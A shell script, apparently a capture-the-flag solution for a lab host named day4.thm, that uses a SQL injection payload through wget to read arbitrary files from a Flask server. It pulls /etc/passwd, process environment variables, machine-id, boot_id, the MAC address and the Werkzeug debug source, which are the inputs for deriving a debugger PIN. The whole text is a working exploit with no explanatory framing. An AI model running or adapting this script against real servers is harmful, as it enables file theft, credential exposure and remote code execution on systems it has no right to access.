#!/bin/sh

ip=day4.thm


get_file() {

wget "http://"$ip":8000/download?id=-8000%27 union select all concat('file://"$1"')-- -" -O $2 
}

get_file "/etc/passwd" "files/passwd.txt"
get_file "/home/mcskidy/app/app.py" "files/app.py"
get_file "/home/mcskidy/.local/lib/python3.8/site-packages/flask/app.py" "files/app2.py"
get_file "/proc/self/environ" "files/environ.txt"
get_file "/proc/self/status" "files/status.txt"
get_file "/proc/net/arp" "files/arp.txt"
get_file "/sys/class/net/eth0/address" "files/address.txt"
get_file "/proc/self/cgroup" "files/cgroup.txt"
get_file "/etc/machine-id" "files/machine-id.txt"
get_file "/proc/sys/kernel/random/boot_id" "files/boot_id.txt"
get_file "/home/mcskidy/.local/lib/python3.8/site-packages/werkzeug/debug/__init__.py" "files/__init__.py"
